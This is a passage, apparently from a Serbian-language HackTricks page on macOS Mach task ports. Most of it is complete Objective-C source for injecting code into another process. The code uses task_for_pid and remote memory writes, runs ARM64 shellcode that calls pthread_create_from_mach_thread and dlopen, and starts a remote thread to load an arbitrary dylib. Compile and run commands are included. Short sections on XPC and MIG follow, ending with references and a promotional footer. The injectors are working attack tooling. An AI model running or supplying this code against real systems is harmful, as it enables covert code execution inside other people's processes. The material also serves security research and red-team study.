kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</detalji>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Ubacivanje Dylib-a u nit putem Task porta

Na macOS-u se **niti** mogu manipulisati putem **Mach-a** ili korišćenjem **posix `pthread` api-ja**. Nit koju smo generisali u prethodnom ubacivanju, generisana je korišćenjem Mach api-ja, tako da **nije posix kompatibilna**.

Bilo je moguće **ubaciti jednostavan shellcode** za izvršavanje komande jer **nije bilo potrebno raditi sa posix** kompatibilnim api-ima, već samo sa Mach-om. **Složenije injekcije** bi zahtevale da je **nit** takođe **posix kompatibilna**.

Stoga, da bismo **unapredili nit**, trebalo bi da pozovemo **`pthread_create_from_mach_thread`** koji će **kreirati validnu pthread**. Zatim, ova nova pthread bi mogla **pozvati dlopen** da **učita dylib** sa sistema, tako da umesto pisanja novog shellcode-a za obavljanje različitih akcija, moguće je učitati prilagođene biblioteke.

Možete pronaći **primer dylib-ova** u (na primer onaj koji generiše log i zatim možete da ga slušate):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nije moguće postaviti dozvole memorije za kod udaljenog niti: Greška %s\n", mach_error_string(kr));
return (-4);
}

// Postavljanje dozvola na alociranu memoriju steka
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nije moguće postaviti dozvole memorije za stek udaljene niti: Greška %s\n", mach_error_string(kr));
return (-4);
}


// Kreiranje niti za izvršavanje shell koda
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // ovo je pravi stek
//remoteStack64 -= 8;  // potrebno je poravnanje od 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Udaljeni stek 64  0x%llx, Udaljeni kod je %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Nije moguće kreirati udaljenu nit: greška %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Upotreba: %s _pid_ _akcija_\n", argv[0]);
fprintf (stderr, "   _akcija_: putanja do dylib fajla na disku\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nije pronađen\n");
}

}
```
</detalji>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Preuzimanje niti putem Task porta <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

U ovoj tehnici se preuzima nit procesa:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Osnovne informacije

XPC, što označava XNU (jezgro koje koristi macOS) međuprocesnu komunikaciju, je okvir za **komunikaciju između procesa** na macOS-u i iOS-u. XPC pruža mehanizam za obavljanje **sigurnih, asinhronih poziva metoda između različitih procesa** na sistemu. To je deo Apple-ovog sigurnosnog paradigma koji omogućava **kreiranje aplikacija sa razdvojenim privilegijama** gde svaki **komponent** radi sa **samo dozvolama koje su mu potrebne** da obavi svoj posao, čime se ograničava potencijalna šteta od kompromitovanog procesa.

Za više informacija o tome kako ova **komunikacija funkcioniše** i kako **može biti ranjiva**, pogledajte:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Generator Mach interfejsa

MIG je kreiran da **simplifikuje proces kreiranja koda Mach IPC**. To je zato što mnogo posla oko programiranja RPC uključuje iste radnje (pakovanje argumenata, slanje poruke, raspakivanje podataka na serveru...).

MIC u osnovi **generiše potreban kod** za server i klijenta da komuniciraju sa datom definicijom (u IDL - jezik definicije interfejsa -). Čak i ako je generisani kod ružan, programer će samo trebati da ga uveze i njegov kod će biti mnogo jednostavniji nego pre.

Za više informacija pogledajte:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Reference

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi** ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
